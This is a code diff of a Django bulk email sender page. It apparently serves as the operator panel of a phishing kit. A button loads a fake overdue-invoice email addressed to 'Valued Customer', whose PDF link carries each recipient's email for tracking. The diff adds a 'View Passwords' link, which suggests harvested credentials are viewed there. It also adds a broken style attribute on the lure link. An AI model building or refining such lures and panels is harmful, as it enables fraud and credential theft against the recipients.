@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -12,27 +13,35 @@
             padding: 20px;
             background-color: #f5f5f5;
         }
+
         .container {
             background: white;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
+
         h1 {
             color: #333;
             text-align: center;
             margin-bottom: 30px;
         }
+
         .form-group {
             margin-bottom: 20px;
         }
+
         label {
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
             color: #555;
         }
-        input[type="text"], input[type="email"], textarea, select {
+
+        input[type="text"],
+        input[type="email"],
+        textarea,
+        select {
             width: 100%;
             padding: 10px;
             border: 1px solid #ddd;
@@ -40,10 +49,12 @@
             font-size: 16px;
             box-sizing: border-box;
         }
+
         textarea {
             height: 200px;
             resize: vertical;
         }
+
         .btn {
             background-color: #007bff;
             color: white;
@@ -54,49 +65,60 @@
             cursor: pointer;
             margin-right: 10px;
         }
+
         .btn:hover {
             background-color: #0056b3;
         }
+
         .btn-secondary {
             background-color: #6c757d;
         }
+
         .btn-secondary:hover {
             background-color: #545b62;
         }
+
         .template-buttons {
             margin-bottom: 20px;
         }
+
         .alert {
             padding: 15px;
             margin-bottom: 20px;
             border-radius: 4px;
         }
+
         .alert-success {
             background-color: #d4edda;
             color: #155724;
             border: 1px solid #c3e6cb;
         }
+
         .alert-error {
             background-color: #f8d7da;
             color: #721c24;
             border: 1px solid #f5c6cb;
         }
+
         .help-text {
             font-size: 12px;
             color: #666;
             margin-top: 5px;
         }
+
         .radio-group {
             display: flex;
             gap: 20px;
             margin-top: 10px;
         }
+
         .radio-group label {
             display: flex;
             align-items: center;
             font-weight: normal;
             gap: 5px;
         }
+
         .template-preview {
             background-color: #f8f9fa;
             border: 1px solid #dee2e6;
@@ -105,6 +127,7 @@
             margin-top: 10px;
             display: none;
         }
+
         .warning-box {
             background-color: #fff3cd;
             border: 1px solid #ffeaa7;
@@ -113,42 +136,55 @@
             margin-bottom: 20px;
             color: #856404;
         }
+
+        a {
+            color: white;
+        }
+
+        a:hover {
+            text-decoration: underline;
+            /* or change color */
+            color: #ddd;
+            /* slightly lighter white */
+        }
     </style>
 </head>
+
 <body>
     <div class="container">
-  
-        
 
-        
+
+
+
         <!-- Django Messages -->
         {% if messages %}
-            {% for message in messages %}
-                <div class="alert alert-{{ message.tags }}">
-                    {{ message }}
-                </div>
-            {% endfor %}
+        {% for message in messages %}
+        <div class="alert alert-{{ message.tags }}">
+            {{ message }}
+        </div>
+        {% endfor %}
         {% endif %}
-        
+
         <form method="post">
             {% csrf_token %}
-            
+
             <div class="form-group">
                 <label for="sender_name">Sender Name:</label>
                 <input type="text" id="sender_name" name="sender_name" placeholder="Your Name or Company">
-               
+
             </div>
-            
+
             <div class="form-group">
                 <label for="recipients">Recipients:</label>
-                <textarea id="recipients" name="recipients" placeholder="Enter email addresses separated by commas, semicolons, or new lines"></textarea>
+                <textarea id="recipients" name="recipients"
+                    placeholder="Enter email addresses separated by commas, semicolons, or new lines"></textarea>
             </div>
-            
+
             <div class="form-group">
                 <label for="subject">Subject:</label>
                 <input type="text" id="subject" name="subject" placeholder="Email subject">
             </div>
-            
+
             <div class="form-group">
                 <label>Email Type:</label>
                 <div class="radio-group">
@@ -162,7 +198,7 @@
                     </label>
                 </div>
             </div>
-            
+
             <div class="template-buttons">
                 <button type="button" class="btn btn-secondary" onclick="loadInvoiceTemplate()">
                     📄 Load Invoice Template
@@ -171,7 +207,7 @@
                     🗑️ Clear Template
                 </button>
             </div>
-            
+
             <div class="form-group">
                 <label for="message">Message:</label>
                 <textarea id="message" name="message" placeholder="Your email message here...
@@ -183,30 +219,37 @@ Available variables:
 - {{ base_url }} - Your website base URL
 - {{ download_url }} - URL for file downloads
 - {{ unsubscribe_url }} - URL for unsubscribe functionality"></textarea>
-             
+
             </div>
-            
+
             <div class="template-preview" id="template-preview">
                 <h4>Template Preview:</h4>
                 <div id="preview-content"></div>
             </div>
-            
+
             <button type="submit" class="btn">📤 Send Emails</button>
         </form>
+
+
+        <br>
+        <div class="pt-3 text-end">
+            <a href="{% url 'password_list' %}" class="btn btn-secondary">📤 View Passwords</a>
+        </div>
+
     </div>
-    
+
 
 
 
     <script>
 
-function loadInvoiceTemplate() {
-    // Get the base URL from current page
-    const baseUrl = window.location.origin;
-    const downloadUrl = `${baseUrl}/download/invoice/`;
-    
-    // Create the fully hardcoded template (no Django template variables)
-    const hardcodedTemplate = `<!DOCTYPE html>
+        function loadInvoiceTemplate() {
+            // Get the base URL from current page
+            const baseUrl = window.location.origin;
+            const downloadUrl = `${baseUrl}/download/invoice/`;
+
+            // Create the fully hardcoded template (no Django template variables)
+            const hardcodedTemplate = `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -313,24 +356,24 @@ function loadInvoiceTemplate() {
         
         <div class="content">
             <div class="sender-info">
-                From: Your Company Accounts Department | To: Valued Customer
+               Dear Valued Customer
             </div>
             
             <div class="invoice-info">
                 <h2>Important Invoice Information from Accounts</h2>
-                <p>Please note that invoices highlighted in red are overdue, while those in green have been paid.</p>
+                <p>Please note that invoices highlighted in red are overdue,<br> while those in green have been paid.</p>
             </div>
             
             <div class="attachment">
-                <a href="${downloadUrl}?email=RECIPIENT_EMAIL_PLACEHOLDER" class="attachment-name">📄 Overdue12_and_Paid_Invoices_2025.pdf</a>
+                <a style="color: #ffffffff; href="${downloadUrl}?email=RECIPIENT_EMAIL_PLACEHOLDER" class="attachment-name">📄 Overdue12_and_Paid_Invoices_2025.pdf</a>
             </div>
             
             <p style="color: #cccccc; text-align: center; margin-top: 30px;">
-                Please review your invoice status and make payments for any overdue amounts.
+                Please review your invoice status <br> and make payments for any overdue amounts.
             </p>
             
             <p style="color: #cccccc; text-align: center; margin-top: 20px; font-size: 14px;">
-                If you have any questions about your invoice, please don't hesitate to contact our accounts department.
+                If you have any questions about your invoice,<br> please don't hesitate to contact our accounts department.
             </p>
         </div>
         
@@ -342,63 +385,64 @@ function loadInvoiceTemplate() {
 </body>
 </html>`;
 
-    // Set the template in the message textarea
-    document.getElementById('message').value = hardcodedTemplate;
-    document.getElementById('subject').value = 'Invoice Due for Payment';
-    document.querySelector('input[name="email_type"][value="html"]').checked = true;
-    
-    console.log("Loaded hardcoded template with base URL:", baseUrl);
-    showPreview();
-}
+            // Set the template in the message textarea
+            document.getElementById('message').value = hardcodedTemplate;
+            document.getElementById('subject').value = 'Invoice Due for Payment';
+            document.querySelector('input[name="email_type"][value="html"]').checked = true;
 
-function showPreview() {
-    const previewDiv = document.getElementById('template-preview');
-    const previewContent = document.getElementById('preview-content');
-    const messageContent = document.getElementById('message').value;
-    
-    if (messageContent.includes('<html>')) {
-        // For preview, replace the placeholder with example email
-        const previewHtml = messageContent.replace(/RECIPIENT_EMAIL_PLACEHOLDER/g, 'john.doe@example.com');
-        
-        previewContent.innerHTML = '<iframe srcdoc="' + previewHtml.replace(/"/g, '&quot;') + '" style="width:100%; height:400px; border:1px solid #ddd;"></iframe>';
-        console.log("Preview generated with example email");
-    } else {
-        previewContent.innerHTML = '<pre>' + messageContent + '</pre>';
-    }
-    previewDiv.style.display = 'block';
-}
-
-    function clearTemplate() {
-        document.getElementById('message').value = '';
-        document.getElementById('subject').value = '';
-        document.querySelector('input[name="email_type"][value="plain"]').checked = true;
-        hidePreview();
-    }
-
-
-
-    function hidePreview() {
-        document.getElementById('template-preview').style.display = 'none';
-    }
-
-    document.querySelector('input[name="email_type"][value="html"]').addEventListener('change', function() {
-        if (this.checked && document.getElementById('message').value) {
+            console.log("Loaded hardcoded template with base URL:", baseUrl);
             showPreview();
         }
-    });
 
-    document.querySelector('input[name="email_type"][value="plain"]').addEventListener('change', function() {
-        if (this.checked) {
+        function showPreview() {
+            const previewDiv = document.getElementById('template-preview');
+            const previewContent = document.getElementById('preview-content');
+            const messageContent = document.getElementById('message').value;
+
+            if (messageContent.includes('<html>')) {
+                // For preview, replace the placeholder with example email
+                const previewHtml = messageContent.replace(/RECIPIENT_EMAIL_PLACEHOLDER/g, 'john.doe@example.com');
+
+                previewContent.innerHTML = '<iframe srcdoc="' + previewHtml.replace(/"/g, '&quot;') + '" style="width:100%; height:400px; border:1px solid #ddd;"></iframe>';
+                console.log("Preview generated with example email");
+            } else {
+                previewContent.innerHTML = '<pre>' + messageContent + '</pre>';
+            }
+            previewDiv.style.display = 'block';
+        }
+
+        function clearTemplate() {
+            document.getElementById('message').value = '';
+            document.getElementById('subject').value = '';
+            document.querySelector('input[name="email_type"][value="plain"]').checked = true;
             hidePreview();
         }
-    });
 
-    document.getElementById('message').addEventListener('input', function() {
-        const isHtml = document.querySelector('input[name="email_type"][value="html"]').checked;
-        if (isHtml && this.value) {
-            showPreview();
+
+
+        function hidePreview() {
+            document.getElementById('template-preview').style.display = 'none';
         }
-    });
-</script>
+
+        document.querySelector('input[name="email_type"][value="html"]').addEventListener('change', function () {
+            if (this.checked && document.getElementById('message').value) {
+                showPreview();
+            }
+        });
+
+        document.querySelector('input[name="email_type"][value="plain"]').addEventListener('change', function () {
+            if (this.checked) {
+                hidePreview();
+            }
+        });
+
+        document.getElementById('message').addEventListener('input', function () {
+            const isHtml = document.querySelector('input[name="email_type"][value="html"]').checked;
+            if (isHtml && this.value) {
+                showPreview();
+            }
+        });
+    </script>
 </body>
+
 </html>
